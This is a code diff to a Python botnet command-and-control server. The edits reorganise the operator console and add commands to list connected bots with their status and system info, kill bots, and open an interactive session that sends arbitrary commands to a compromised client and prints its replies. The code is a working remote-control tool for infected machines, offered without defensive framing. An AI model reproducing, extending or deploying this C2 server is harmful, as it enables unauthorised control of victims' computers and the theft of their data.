@@ -67,8 +67,9 @@ sock.listen(10)
 def main():
 	global BOTS,BOTNOS,KILLTHREAD
 	while True:
-		INPUT=input(">>")
-		if INPUT=="show bots":
+		INPUT=""
+		INPUT=input("NET >>")
+		if INPUT=="show bots status":
 			for i in range(BOTNOS):
 				try:
 					BOTSTEMP=BOTS[i+1]
@@ -80,10 +81,18 @@ def main():
 						if OUTPUT=='pingbot':
 							BOTSTEMP[1]="ONLINE"
 						else:
-							BOTSTEMP[1]="OFFLINE/SENT UNKNOWN DATA"
+							BOTSTEMP[1]="OFFLINE/SENT UNKNOWN RESPONSE"
 					except:
 						BOTSTEMP[1]="OFFINE"
 					print("Bot Number: ",i+1,"Bot Status ",BOTSTEMP[1])
+				except:
+					pass
+		elif INPUT=="show bots info":
+			for i in range(BOTNOS):
+				try:
+					BOTSTEMP=BOTS[i+1]
+					print("--------------------------------------------------------------------------------------")
+					print("Bot Number: ",i+1,"Bot Info ",BOTSTEMP[0])
 				except:
 					pass
 		elif INPUT[:8]=="kill bot":
@@ -97,48 +106,47 @@ def main():
 				BOTS.pop(BOTNO)
 				print("[SYSTEM | BOT Info] Killed bot ",BOTNO)
 			except:
-				print("[SYSTEM] Bot %s not found!"%BOTNO)
+				print("[SYSTEM|| Kill Bot] Bot %s not found!"%BOTNO)
 		elif INPUT[:7]=="use bot":
 			try:
 				BOTNO=int(INPUT[7:])
 				BOTSTEMP=BOTS[BOTNO]
 				print("[SYSTEM | BOT Info] Using bot ",BOTNO)
-				COMMEXEC(BOTNO,BOTSTEMP[2],BOTSTEMP[3])
+				CLIENT_SOCK,CLIENT_ADDR=BOTSTEMP[2],BOTSTEMP[3]
+				while True:
+					try:
+						COMM_SEND=input()
+						if COMM_SEND=="":
+							print("[SYSTEM] Empty Request Detected!")
+						else:
+							if COMM_SEND=="background":
+								print("[SYSTEM | BOT Info] Backgrounding bot ",BOTNO)
+								break
+							COMM_SEND=COMM_SEND.encode()
+							CLIENT_SOCK.send(COMM_SEND)
+							COMM_RECV=CLIENT_SOCK.recv(BUFFER)
+							COMM_RECV=COMM_RECV.decode()
+							print(COMM_RECV,end="")
+							if COMM_RECV=="[Client] Self Destruct Initiated!":
+								print("\n")
+								break
+					except Exception as Exec:
+						print("[SYSTEM | CRITICAL] System sent Command but Client didn't send any response!")
+						if VERBOSE:
+							print(f"[SYSTEM | DEBUG] {Exec}")
 			except:
-				print("[SYSTEM] Bot %s not found!"%BOTNO)
+				print("[SYSTEM | Use Bot] Bot %s not found!"%BOTNO)
 		elif INPUT=="exit":
 			KILLTHREAD=True
 			break
+		else:
+			pass
 	try:
 		sock.close()
 		exit()
 	except:
 		exit()
-			
-		
-def COMMEXEC(BOTNO,CLIENT_SOCK,CLIENT_ADDR):
-	while True:
-		try:
-			COMM_SEND=input()
-			if COMM_SEND=="":
-				pass
-			else:
-				if COMM_SEND=="background":
-					print("[SYSTEM | BOT Info] Backgrounding bot ",BOTNO)
-					break
-				COMM_SEND=COMM_SEND.encode()
-				CLIENT_SOCK.send(COMM_SEND)
-				COMM_RECV=CLIENT_SOCK.recv(BUFFER)
-				COMM_RECV=COMM_RECV.decode()
-				print(COMM_RECV,end="")
-				if COMM_RECV=="[Client] Self Destruct Initiated!":
-					print("\n")
-					break
-		except Exception as Exec:
-			print("[SYSTEM | CRITICAL] System sent Command but Client didn't send any response!")
-			if VERBOSE:
-				print(f"[SYSTEM | DEBUG] {Exec}")
-	main()
+	
 def BOTCONNECTOR():
 	global BOTNOS,BOTS,KILLTHREAD
 	while True: 
@@ -155,7 +163,7 @@ def BOTCONNECTOR():
 			print("[SYSTEM] Client Acknowledged!")
 			print("[SYSTEM] Client ready to accept commands!")
 			print("[CLIENT] UUID: ",ACK_RECV[6:42])
-			BOTS[BOTNOS]=[ACK_RECV[6:42],"ONLINE",CLIENT_SOCK,CLIENT_ADDR]
+			BOTS[BOTNOS]=[ACK_RECV,"ONLINE",CLIENT_SOCK,CLIENT_ADDR]
 			print(f"[CLIENT]Printing Sysinfo:\n {ACK_RECV}",end="")
 			if KILLTHREAD:
 				break
